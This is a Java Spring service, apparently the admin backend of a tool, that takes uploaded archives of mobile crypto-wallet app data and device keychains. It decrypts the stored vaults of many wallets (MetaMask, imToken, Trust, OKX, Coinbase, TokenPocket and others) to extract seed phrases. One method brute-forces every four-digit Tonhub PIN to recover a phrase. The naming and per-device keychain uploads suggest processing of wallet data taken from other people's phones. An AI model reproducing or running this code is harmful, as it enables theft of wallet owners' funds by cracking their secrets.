package com.admin.service;

import java.nio.charset.StandardCharsets;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.Base64;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;
import java.util.function.BiConsumer;

import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

import org.bouncycastle.crypto.digests.SHA256Digest;
import org.bouncycastle.crypto.digests.SHA512Digest;
import org.bouncycastle.crypto.generators.PKCS5S2ParametersGenerator;
import org.bouncycastle.crypto.params.KeyParameter;
import org.springframework.stereotype.Service;

import com.admin.config.V26AdminProperties;
import com.admin.crypto.BitkeepWallet;
import com.admin.crypto.Coin98Mmkv;
import com.admin.crypto.CoinbaseWallet;
import com.admin.crypto.GlobalWallet;
import com.admin.crypto.KeychainXml;
import com.admin.crypto.OkxWallet;
import com.admin.crypto.OnekeyFamily;
import com.admin.crypto.TonhubCrypto;
import com.admin.parse.ArchiveIO;
import com.admin.parse.KeystoreV3;
import com.admin.parse.TrustWallet;
import com.admin.util.Bip39Util;
import com.admin.util.UploadPaths;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONArray;
import com.alibaba.fastjson.JSONObject;

import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;

/**
 * 纯 Java 钱包密码解锁（不再调用 Python）。
 * 已覆盖：metamask / imtoken / tronlink / trust / tonhub /
 * okx / coin98 / onekey / digitalshield / coinbase / bitkeep / globalwallet / tokenpocket。
 */
@Slf4j
@Service
@RequiredArgsConstructor
public class WalletUnlockService {

    private final Bip39Util bip39Util;
    private final TrustWallet trustWallet;
    private final V26AdminProperties props;

    public Map<String, Object> unlockFromZip(String walletKey, Path zip, String password, String walletInstanceId) {
        return unlockFromZip(walletKey, zip, password, walletInstanceId, null);
    }

    public Map<String, Object> unlockFromZip(String walletKey, Path zip, String password,
            String walletInstanceId, String deviceId) {
        Map<String, Object> out = new LinkedHashMap<>();
        out.put("wallet_key", walletKey);
        if (password == null || password.isBlank()) {
            out.put("ok", false);
            out.put("error", "请输入密码");
            return out;
        }
        if (zip == null) {
            out.put("ok", false);
            out.put("error", "上传文件不存在");
            return out;
        }
        String key = walletKey == null ? "" : walletKey.trim().toLowerCase(Locale.ROOT);
        try {
            switch (key) {
                case "metamask":
                    return unlockMetamask(zip, password);
                case "imtoken":
                    return unlockImtoken(zip, password, walletInstanceId);
                case "tronlink":
                    return unlockTronlink(zip, password);
                case "trust":
                    return unlockTrust(zip, password);
                case "tonhub":
                    return unlockTonhub(zip, password);
                case "okx":
                    return unlockOkx(zip, password, deviceId);
                case "coin98":
                    return unlockCoin98(zip, password, deviceId);
                case "onekey":
                    return unlockOnekey(zip, password, deviceId);
                case "digitalshield":
                    return unlockDigitalshield(zip, password);
                case "coinbase":
                    return unlockCoinbase(zip, password, deviceId);
                case "bitkeep":
                    return unlockBitkeep(zip, password, deviceId);
                case "globalwallet":
                case "tokenpocket":
                    return unlockGlobal(zip, password, deviceId, key);
                default:
                    out.put("ok", false);
                    out.put("error", "该钱包暂未提供纯 Java 解锁：" + key
                            + "（已支持 metamask/imtoken/tronlink/trust/tonhub/okx/coin98/"
                            + "onekey/digitalshield/coinbase/bitkeep/globalwallet/tokenpocket）");
                    return out;
            }
        } catch (Exception e) {
            log.warn("unlock fail key={}: {}", key, e.toString());
            out.put("ok", false);
            out.put("error", e.getMessage() == null ? "解锁失败" : e.getMessage());
            return out;
        }
    }

    public Map<String, Object> bruteTonhub(Path zip, BiConsumer<Integer, Integer> onProgress) {
        Map<String, Object> fail = new LinkedHashMap<>();
        fail.put("ok", false);
        byte[] mmkv = findMemberBytes(zip, name -> {
            String n = name.toLowerCase(Locale.ROOT);
            return n.endsWith(".mmkv") || n.contains("mmkv");
        });
        if (mmkv == null) {
            fail.put("error", "未找到 mmkv");
            return fail;
        }
        Map<String, Object> info;
        try {
            info = TonhubCrypto.parseMmkv(mmkv);
        } catch (Exception e) {
            fail.put("error", e.getMessage());
            return fail;
        }
        byte[] secretKeyEnc = TonhubCrypto.secretKeyEncFromWallet((JSONObject) info.get("wallet"));
        if (secretKeyEnc == null) {
            fail.put("error", "wallet 无 secretKeyEnc");
            return fail;
        }
        String salt = String.valueOf(info.get("salt"));
        byte[] encAppKey = (byte[]) info.get("enc_app_key");
        int total = 10000;
        for (int i = 0; i < total; i++) {
            if (onProgress != null && (i % 50 == 0 || i + 1 == total)) {
                onProgress.accept(i, total);
            }
            String pin = String.format("%04d", i);
            String phrase = TonhubCrypto.decryptPin(pin, salt, encAppKey, secretKeyEnc);
            if (phrase != null && TonhubCrypto.phraseOk(phrase)) {
                if (onProgress != null) {
                    onProgress.accept(i + 1, total);
                }
                Map<String, Object> ok = new LinkedHashMap<>();
                ok.put("ok", true);
                ok.put("pin", pin);
                ok.put("phrase", phrase);
                ok.put("tried", i + 1);
                ok.put("total", total);
                return ok;
            }
        }
        if (onProgress != null) {
            onProgress.accept(total, total);
        }
        fail.put("error", "未爆破出 PIN");
        fail.put("tried", total);
        fail.put("total", total);
        return fail;
    }

    private Map<String, Object> unlockMetamask(Path zip, String password) {
        byte[] raw = findMemberBytes(zip, name -> ArchiveIO.baseName(name).equals("persist-KeyringController")
                || name.toLowerCase(Locale.ROOT).endsWith("/persist-keyringcontroller"));
        if (raw == null) {
            return failKey("metamask", "未找到 MetaMask vault");
        }
        JSONObject root = parseObj(raw);
        if (root == null) {
            return failKey("metamask", "vault 格式无效");
        }
        Object vaultRaw = root.get("vault");
        JSONObject vault;
        if (vaultRaw instanceof String) {
            vault = JSON.parseObject((String) vaultRaw);
        } else if (vaultRaw instanceof JSONObject) {
            vault = (JSONObject) vaultRaw;
        } else {
            return failKey("metamask", "vault 格式无效");
        }
        byte[] plain = decryptMetamaskVault(vault, password);
        if (plain == null) {
            return failKey("metamask", "密码错误");
        }
        String phrase = mnemonicFromPlain(plain);
        if (phrase == null || phrase.isBlank()) {
            return failKey("metamask", "密码错误");
        }
        return okKey("metamask", phrase);
    }

    private Map<String, Object> unlockImtoken(Path zip, String password, String walletInstanceId) {
        List<byte[]> files = new ArrayList<>();
        List<String> names = new ArrayList<>();
        ArchiveIO.walk(zip, null, (name, in, size) -> {
            String nl = name.toLowerCase(Locale.ROOT).replace('\\', '/');
            if (nl.contains("walletsv2") && nl.endsWith(".json")) {
                byte[] raw = ArchiveIO.readLimited(in, 2_000_000);
                if (raw != null) {
                    files.add(raw);
                    names.add(ArchiveIO.baseName(name));
                }
            } else {
                ArchiveIO.skipFully(in, size);
            }
        }, 2_000_000);
        String want = walletInstanceId == null ? "" : walletInstanceId.trim();
        List<String> phrases = new ArrayList<>();
        boolean anyMacFail = false;
        boolean any = false;
        for (int i = 0; i < files.size(); i++) {
            String stem = names.get(i);
            int dot = stem.lastIndexOf('.');
            if (dot > 0) {
                stem = stem.substring(0, dot);
            }
            if (!want.isEmpty() && !want.equals(stem)) {
                continue;
            }
            any = true;
            JSONObject obj = parseObj(files.get(i));
            if (obj == null) {
                continue;
            }
            JSONObject crypto = obj.getJSONObject("crypto");
            if (crypto == null) {
                crypto = obj;
            }
            byte[] plain = KeystoreV3.decrypt(crypto, password);
            if (plain == null) {
                anyMacFail = true;
                continue;
            }
            String text = new String(plain, StandardCharsets.UTF_8).trim();
            String phrase = text.split("\\s+").length >= 12 ? text : mnemonicFromPlain(plain);
            if (phrase != null && !phrase.isBlank()) {
                phrases.add(phrase.trim());
            }
        }
        if (!want.isEmpty() && !any) {
            return failKey("imtoken", "未找到钱包 keystore：" + (want.length() > 8 ? want.substring(0, 8) + "…" : want));
        }
        if (files.isEmpty()) {
            return failKey("imtoken", "未找到 walletsV2");
        }
        if (!phrases.isEmpty()) {
            return okKey("imtoken", String.join("\n", phrases));
        }
        return failKey("imtoken", anyMacFail || any ? "密码错误" : "解密失败");
    }

    private Map<String, Object> unlockTronlink(Path zip, String password) {
        List<String> phrases = new ArrayList<>();
        boolean tried = false;
        ArchiveIO.walk(zip, null, (name, in, size) -> {
            String nl = name.toLowerCase(Locale.ROOT).replace('\\', '/');
            if (!(nl.contains("/keystore/") || nl.contains("keystore/")) || nl.endsWith("/")) {
                ArchiveIO.skipFully(in, size);
                return;
            }
            byte[] raw = ArchiveIO.readLimited(in, 2_000_000);
            JSONObject obj = parseObj(raw);
            if (obj == null) {
                return;
            }
            JSONObject crypto = obj.getJSONObject("crypto");
            if (crypto == null) {
                return;
            }
            byte[] plain = KeystoreV3.decrypt(crypto, password);
            if (plain == null) {
                return;
            }
            String phrase = mnemonicFromPlain(plain);
            if (phrase == null) {
                phrase = new String(plain, StandardCharsets.UTF_8).trim().replace("\0", "");
            }
            if (phrase != null && (phrase.split("\\s+").length >= 12 || phrase.length() >= 32)) {
                synchronized (phrases) {
                    phrases.add(phrase);
                }
            }
        }, 2_000_000);
        // mark tried by walking again lightly — if any keystore json existed
        AtomicReference<Boolean> saw = new AtomicReference<>(false);
        ArchiveIO.walk(zip, null, (name, in, size) -> {
            String nl = name.toLowerCase(Locale.ROOT);
            if (nl.contains("keystore") && !nl.endsWith("/")) {
                saw.set(true);
            }
            ArchiveIO.skipFully(in, size);
        }, 0);
        tried = Boolean.TRUE.equals(saw.get());
        if (!phrases.isEmpty()) {
            return okKey("tronlink", String.join("\n", phrases));
        }
        if (tried) {
            return failKey("tronlink", "密码错误");
        }
        return failKey("tronlink", "未找到 keystore");
    }

    private Map<String, Object> unlockTrust(Path zip, String password) {
        Map<String, String> utc = new LinkedHashMap<>();
        utc.put("_", password);
        List<String> phrases = trustWallet.recover(zip, null, utc);
        if (phrases == null || phrases.isEmpty()) {
            return failKey("trust", "密码错误或未找到 UTC keystore");
        }
        return okKey("trust", String.join("\n", phrases));
    }

    private Map<String, Object> unlockTonhub(Path zip, String password) {
        byte[] mmkv = findMemberBytes(zip, name -> {
            String n = name.toLowerCase(Locale.ROOT);
            return n.endsWith(".mmkv") || n.contains("mmkv");
        });
        if (mmkv == null) {
            return failKey("tonhub", "未找到 mmkv");
        }
        String pin = password.trim();
        if (pin.isEmpty()) {
            return failKey("tonhub", "请输入 PIN");
        }
        try {
            Map<String, Object> info = TonhubCrypto.parseMmkv(mmkv);
            byte[] secretKeyEnc = TonhubCrypto.secretKeyEncFromWallet((JSONObject) info.get("wallet"));
            String phrase = TonhubCrypto.decryptPin(pin, String.valueOf(info.get("salt")),
                    (byte[]) info.get("enc_app_key"), secretKeyEnc);
            if (phrase == null || !TonhubCrypto.phraseOk(phrase)) {
                return failKey("tonhub", "密码错误");
            }
            return okKey("tonhub", phrase);
        } catch (Exception e) {
            return failKey("tonhub", "解析失败: " + e.getMessage());
        }
    }

    private Map<String, Object> unlockOkx(Path zip, String password, String deviceId) {
        byte[] walletDb = findMemberBytes(zip, name -> {
            String n = name.replace('\\', '/').toLowerCase(Locale.ROOT);
            String base = ArchiveIO.baseName(name).toLowerCase(Locale.ROOT);
            return "wallet".equals(base) || n.endsWith("/wallet") || n.endsWith("/documents/wallet");
        });
        if (walletDb != null && walletDb.length >= 16) {
            String head = new String(walletDb, 0, 15, StandardCharsets.UTF_8);
            if (!head.startsWith("SQLite format 3")) {
                walletDb = null;
            }
        }
        Path kc = findKeychain(deviceId);
        String kcText = KeychainXml.readString(kc);
        List<byte[]> vaults = new ArrayList<>();
        ArchiveIO.walk(zip, null, (name, in, size) -> {
            String nl = name.toLowerCase(Locale.ROOT);
            String base = ArchiveIO.baseName(name).toLowerCase(Locale.ROOT);
            if ((nl.endsWith(".json") || nl.endsWith(".plist") || base.contains("vault")) && size > 0 && size < 2_000_000) {
                byte[] raw = ArchiveIO.readLimited(in, 2_000_000);
                if (raw != null) {
                    vaults.add(raw);
                }
            } else {
                ArchiveIO.skipFully(in, size);
            }
        }, 2_000_000);
        Map<String, Object> r = OkxWallet.unlock(walletDb, kcText, password, vaults, bip39Util);
        return tagResult(r, "okx");
    }

    private Map<String, Object> unlockCoin98(Path zip, String password, String deviceId) {
        byte[] enc = findMemberBytes(zip, n -> ArchiveIO.baseName(n).equalsIgnoreCase("mmkv.default.enc"));
        byte[] crc = findMemberBytes(zip, n -> {
            String b = ArchiveIO.baseName(n).toLowerCase(Locale.ROOT);
            return b.equals("mmkv.default.enc.crc") || b.endsWith(".enc.crc");
        });
        byte[] plain = findMemberBytes(zip, n -> {
            String b = ArchiveIO.baseName(n).toLowerCase(Locale.ROOT);
            return b.equals("mmkv.default") && !n.toLowerCase(Locale.ROOT).endsWith(".enc");
        });
        Path kc = findKeychain(deviceId);
        String kcText = KeychainXml.readString(kc);
        Map<String, Object> r = Coin98Mmkv.unlock(enc, crc, plain, password, kcText, bip39Util,
                this::decryptMetamaskVault);
        return tagResult(r, "coin98");
    }

    private Map<String, Object> unlockOnekey(Path zip, String password, String deviceId) {
        byte[] raw = findMemberBytes(zip, n -> {
            String b = ArchiveIO.baseName(n);
            return "OneKeyV5".equals(b) || "DigitalShieldV5".equals(b);
        });
        if (raw == null) {
            return failKey("onekey", "未找到 OneKeyV5 数据库");
        }
        String lse = OnekeyFamily.onekeyLseKeyHexFromKeychain(findKeychain(deviceId));
        Map<String, Object> r = OnekeyFamily.unlockOnekey(raw, password, lse, bip39Util);
        return tagResult(r, "onekey");
    }

    private Map<String, Object> unlockDigitalshield(Path zip, String password) {
        byte[] raw = findMemberBytes(zip, n -> {
            String b = ArchiveIO.baseName(n);
            return "DigitalShieldV5".equals(b) || "OneKeyV5".equals(b);
        });
        if (raw == null) {
            return failKey("digitalshield", "未找到 DigitalShieldV5 数据库");
        }
        Map<String, Object> r = OnekeyFamily.unlockDigitalShield(raw, password, bip39Util);
        return tagResult(r, "digitalshield");
    }

    private Map<String, Object> unlockCoinbase(Path zip, String password, String deviceId) {
        Path kc = findKeychain(deviceId);
        List<byte[]> docs = new ArrayList<>();
        byte[][] walletDb = new byte[1][];
        ArchiveIO.walk(zip, null, (name, in, size) -> {
            String base = ArchiveIO.baseName(name).toLowerCase(Locale.ROOT);
            String nl = name.toLowerCase(Locale.ROOT);
            if (base.equals("wallet-rn-v2.sqlite") && size > 0 && size < 20_000_000) {
                walletDb[0] = ArchiveIO.readLimited(in, 20_000_000);
            } else if ((nl.contains("mmkv") || base.contains("plaintext"))
                    && size > 0 && size < 8_000_000) {
                byte[] raw = ArchiveIO.readLimited(in, 8_000_000);
                if (raw != null) {
                    docs.add(raw);
                }
            } else {
                ArchiveIO.skipFully(in, size);
            }
        }, 20_000_000);
        Map<String, Object> r = CoinbaseWallet.unlock(kc, password, docs, walletDb[0], bip39Util);
        return tagResult(r, "coinbase");
    }

    private Map<String, Object> unlockBitkeep(Path zip, String password, String deviceId) {
        byte[] db = findMemberBytes(zip, n -> ArchiveIO.baseName(n).equalsIgnoreCase("bitkeep.db"));
        Path kc = findKeychain(deviceId);
        Map<String, Object> r = BitkeepWallet.unlock(db, kc, password, null, bip39Util);
        return tagResult(r, "bitkeep");
    }

    private Map<String, Object> unlockGlobal(Path zip, String password, String deviceId, String walletKey) {
        List<byte[]> f4 = new ArrayList<>();
        List<Path> sqlites = new ArrayList<>();
        Path tmp = null;
        try {
            tmp = java.nio.file.Files.createTempDirectory("gw-wcdb-");
            final Path tmpDir = tmp;
            ArchiveIO.walk(zip, null, (name, in, size) -> {
                String nl = name.replace('\\', '/').toLowerCase(Locale.ROOT);
                String base = ArchiveIO.baseName(name).toLowerCase(Locale.ROOT);
                if (nl.contains("f4secyr") && size > 0 && size < 8_000_000) {
                    byte[] raw = ArchiveIO.readLimited(in, 8_000_000);
                    if (raw != null) {
                        f4.add(raw);
                    }
                } else if (("main.sqlite3".equals(base) || "label.sqlite3".equals(base))
                        && size > 0 && size < 80_000_000) {
                    byte[] raw = ArchiveIO.readLimited(in, 80_000_000);
                    if (raw != null) {
                        try {
                            Path dest = tmpDir.resolve(base);
                            java.nio.file.Files.write(dest, raw);
                            sqlites.add(dest);
                        } catch (Exception ignored) {
                        }
                    }
                } else {
                    ArchiveIO.skipFully(in, size);
                }
            }, 80_000_000);
            Path kc = findKeychain(deviceId);
            Map<String, Object> r = GlobalWallet.unlock(f4, sqlites, kc, password, bip39Util);
            return tagResult(r, walletKey);
        } catch (Exception e) {
            return failKey(walletKey, "读取钱包包失败");
        } finally {
            if (tmp != null) {
                try {
                    java.nio.file.Files.walk(tmp)
                            .sorted((a, b) -> b.compareTo(a))
                            .forEach(p -> {
                                try {
                                    java.nio.file.Files.deleteIfExists(p);
                                } catch (Exception ignored) {
                                }
                            });
                } catch (Exception ignored) {
                }
            }
        }
    }

    private Path findKeychain(String deviceId) {
        if (deviceId == null || deviceId.isBlank()) {
            return null;
        }
        return UploadPaths.findDeviceKeychain(props.getUploadDir(), deviceId);
    }

    private static Map<String, Object> tagResult(Map<String, Object> r, String key) {
        if (r == null) {
            return failKey(key, "解锁失败");
        }
        r.put("wallet_key", key);
        if (Boolean.TRUE.equals(r.get("ok"))) {
            return r;
        }
        r.putIfAbsent("error", "密码错误");
        return r;
    }

    private byte[] decryptMetamaskVault(JSONObject blob, String password) {
        try {
            byte[] salt = metamaskSalt(blob);
            byte[] iv = b64OrHex(blob.getString("iv"));
            String ctRaw = blob.getString("cipher");
            if (ctRaw == null || ctRaw.isBlank()) {
                ctRaw = blob.getString("data");
            }
            byte[] ct = b64OrHex(ctRaw);
            if (ct.length == 0 || salt.length == 0) {
                return null;
            }
            JSONObject meta = blob.getJSONObject("keyMetadata");
            JSONObject params = meta == null ? null : meta.getJSONObject("params");
            int iterations = 5000;
            if (params != null && params.getIntValue("iterations") > 0) {
                iterations = params.getIntValue("iterations");
            } else if (meta != null && meta.getIntValue("iterations") > 0) {
                iterations = meta.getIntValue("iterations");
            }
            String algo = "sha512";
            if (params != null && params.getString("hash") != null) {
                algo = params.getString("hash").toLowerCase(Locale.ROOT).replace("sha-", "sha");
            }
            int dklen = 32;
            if (params != null) {
                if (params.getIntValue("dklen") > 0) {
                    dklen = params.getIntValue("dklen");
                } else if (params.getIntValue("length") > 0) {
                    dklen = params.getIntValue("length");
                }
            }
            byte[] key = pbkdf2(algo, password.getBytes(StandardCharsets.UTF_8), salt, iterations, dklen);
            byte[] aesKey = key.length >= 32 ? java.util.Arrays.copyOf(key, 32) : key;
            String lib = String.valueOf(blob.getOrDefault("lib", "")).toLowerCase(Locale.ROOT);
            if (("quick-crypto".equals(lib) || (blob.getString("cipher") != null && blob.getString("data") == null))
                    && iv.length >= 16 && ct.length % 16 == 0) {
                byte[] plain = aesCbcPkcs7(aesKey, iv, ct);
                if (plain != null && plain.length > 0 && (plain[0] == '{' || plain[0] == '[')) {
                    return plain;
                }
            }
            if (iv.length >= 16 && ct.length % 16 == 0) {
                byte[] plain = aesCbcPkcs7(aesKey, iv, ct);
                if (plain != null) {
                    return plain;
                }
            }
            for (int tagLen : new int[] {16, 12}) {
                if (ct.length <= tagLen) {
                    continue;
                }
                try {
                    byte[] nonce = iv.length >= 12 ? java.util.Arrays.copyOf(iv, 12) : iv;
                    Cipher c = Cipher.getInstance("AES/GCM/NoPadding");
                    c.init(Cipher.DECRYPT_MODE, new SecretKeySpec(aesKey, "AES"), new GCMParameterSpec(tagLen * 8, nonce));
                    return c.doFinal(ct);
                } catch (Exception ignored) {
                }
            }
            return null;
        } catch (Exception e) {
            return null;
        }
    }

    private static byte[] aesCbcPkcs7(byte[] key, byte[] iv, byte[] ct) {
        try {
            Cipher c = Cipher.getInstance("AES/CBC/PKCS5Padding");
            c.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key, "AES"), new IvParameterSpec(java.util.Arrays.copyOf(iv, 16)));
            return c.doFinal(ct);
        } catch (Exception e) {
            return null;
        }
    }

    private static byte[] metamaskSalt(JSONObject blob) {
        Object saltRaw = blob.get("salt");
        if (saltRaw == null) {
            return new byte[0];
        }
        String lib = String.valueOf(blob.getOrDefault("lib", "")).toLowerCase(Locale.ROOT);
        if ("quick-crypto".equals(lib)) {
            return String.valueOf(saltRaw).getBytes(StandardCharsets.UTF_8);
        }
        return b64OrHex(String.valueOf(saltRaw));
    }

    private static byte[] b64OrHex(String s) {
        String raw = s == null ? "" : s.trim();
        if (raw.isEmpty()) {
            return new byte[0];
        }
        boolean hex = raw.length() % 2 == 0 && raw.length() >= 2;
        if (hex) {
            for (int i = 0; i < raw.length(); i++) {
                char c = raw.charAt(i);
                if (!((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F'))) {
                    hex = false;
                    break;
                }
            }
        }
        if (hex) {
            try {
                byte[] out = new byte[raw.length() / 2];
                for (int i = 0; i < out.length; i++) {
                    out[i] = (byte) Integer.parseInt(raw.substring(i * 2, i * 2 + 2), 16);
                }
                return out;
            } catch (Exception ignored) {
            }
        }
        int pad = (4 - (raw.length() % 4)) % 4;
        return Base64.getDecoder().decode(raw + "====".substring(0, pad));
    }

    private static byte[] pbkdf2(String algo, byte[] password, byte[] salt, int iter, int dklen) {
        PKCS5S2ParametersGenerator gen;
        if (algo != null && algo.contains("256")) {
            gen = new PKCS5S2ParametersGenerator(new SHA256Digest());
        } else {
            gen = new PKCS5S2ParametersGenerator(new SHA512Digest());
        }
        gen.init(password, salt, iter);
        return ((KeyParameter) gen.generateDerivedParameters(dklen * 8)).getKey();
    }

    private String mnemonicFromPlain(byte[] plain) {
        if (plain == null) {
            return null;
        }
        if (plain.length == 16 || plain.length == 20 || plain.length == 24
                || plain.length == 28 || plain.length == 32) {
            String fromEnt = bip39Util.entropyToMnemonic(plain);
            if (fromEnt != null && bip39Util.validateMnemonic(fromEnt)) {
                return fromEnt;
            }
        }
        String text = new String(plain, StandardCharsets.UTF_8).trim().replace("\"", "");
        try {
            Object obj = JSON.parse(text);
            String fromObj = mnemonicFromKeyringObj(obj);
            if (fromObj != null) {
                return fromObj;
            }
        } catch (Exception ignored) {
        }
        return bip39Util.searchPhrase(text.replace(',', ' '));
    }

    private String mnemonicFromKeyringObj(Object obj) {
        if (obj instanceof JSONArray) {
            JSONArray arr = (JSONArray) obj;
            for (int i = 0; i < arr.size(); i++) {
                String hit = mnemonicFromKeyringObj(arr.get(i));
                if (hit != null) {
                    return hit;
                }
            }
            return null;
        }
        if (!(obj instanceof JSONObject)) {
            return null;
        }
        JSONObject jo = (JSONObject) obj;
        JSONObject data = jo.getJSONObject("data");
        if (data != null) {
            Object m = data.get("mnemonic");
            String hit = mnemonicValue(m);
            if (hit != null) {
                return hit;
            }
        }
        for (String k : new String[] {"mnemonic", "seed", "phrase"}) {
            String hit = mnemonicValue(jo.get(k));
            if (hit != null) {
                return hit;
            }
        }
        return null;
    }

    private String mnemonicValue(Object m) {
        if (m instanceof String) {
            String s = ((String) m).trim();
            return bip39Util.validateMnemonic(s) ? s : null;
        }
        if (m instanceof JSONArray) {
            JSONArray arr = (JSONArray) m;
            if (!arr.isEmpty() && arr.get(0) instanceof Number) {
                byte[] raw = new byte[arr.size()];
                for (int i = 0; i < arr.size(); i++) {
                    raw[i] = (byte) arr.getIntValue(i);
                }
                String text = new String(raw, StandardCharsets.UTF_8).trim();
                return bip39Util.validateMnemonic(text) ? text : null;
            }
        }
        return null;
    }

    private byte[] findMemberBytes(Path zip, java.util.function.Predicate<String> pred) {
        byte[][] holder = new byte[1][];
        ArchiveIO.walk(zip, null, (name, in, size) -> {
            if (holder[0] == null && pred.test(name)) {
                holder[0] = ArchiveIO.readLimited(in, 8_000_000);
            } else {
                ArchiveIO.skipFully(in, size);
            }
        }, 8_000_000);
        return holder[0];
    }

    private static JSONObject parseObj(byte[] raw) {
        if (raw == null || raw.length == 0) {
            return null;
        }
        try {
            Object o = JSON.parse(new String(raw, StandardCharsets.UTF_8));
            return o instanceof JSONObject ? (JSONObject) o : null;
        } catch (Exception e) {
            return null;
        }
    }

    private static Map<String, Object> okKey(String key, String phrase) {
        Map<String, Object> m = new LinkedHashMap<>();
        m.put("ok", true);
        m.put("phrase", phrase);
        m.put("wallet_key", key);
        return m;
    }

    private static Map<String, Object> failKey(String key, String error) {
        Map<String, Object> m = new LinkedHashMap<>();
        m.put("ok", false);
        m.put("error", error);
        m.put("wallet_key", key);
        return m;
    }
}
